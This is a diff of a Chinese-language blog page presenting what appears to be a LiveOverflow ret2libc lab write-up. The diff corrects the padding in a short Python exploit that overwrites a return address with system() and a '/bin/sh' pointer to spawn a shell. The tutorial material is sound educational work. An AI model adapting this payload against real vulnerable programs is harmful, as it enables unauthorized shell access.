@@ -96,7 +96,7 @@
 <meta property="og:image" content="https://i.imgur.com/6PN7c3h.png">
 <meta property="og:image" content="https://i.imgur.com/BAWzxYv.png">
 <meta property="og:image" content="https://i.imgur.com/9Vo93dm.png">
-<meta property="og:updated_time" content="2018-10-18T00:49:34.242Z">
+<meta property="og:updated_time" content="2018-11-20T14:34:35.838Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Liveoverflow-0x0F-ret2libc">
 <meta name="twitter:description" content="接着上一个视频的学习，本次主要讲了ret2libc是怎么实现的。">
@@ -379,7 +379,7 @@
 <p>用下面的命令找到/bin/sh偏移地址<br><img src="https://i.imgur.com/6PN7c3h.png" alt=""><br>验证一下，没问题</p>
 <p><img src="https://i.imgur.com/BAWzxYv.png" alt=""></p>
 <p>可以开始写脚本了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">20</span></span><br><span class="line">system = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7ecffb0</span>)</span><br><span class="line">return_after_system = <span class="string">"AAAA"</span></span><br><span class="line">bin_sh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7fb63bf</span>)</span><br><span class="line"><span class="keyword">print</span> padding + system + return_after_system + bin_sh</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">"A"</span>*<span class="number">4</span>*<span class="number">20</span></span><br><span class="line">system = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7ecffb0</span>)</span><br><span class="line">return_after_system = <span class="string">"AAAA"</span></span><br><span class="line">bin_sh = struct.pack(<span class="string">"I"</span>, <span class="number">0xb7fb63bf</span>)</span><br><span class="line"><span class="keyword">print</span> padding + system + return_after_system + bin_sh</span><br></pre></td></tr></table></figure>
 <p>运行<br><img src="https://i.imgur.com/9Vo93dm.png" alt=""><br>成功;)</p>
 
       
@@ -500,7 +500,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-count">14</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -522,7 +522,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
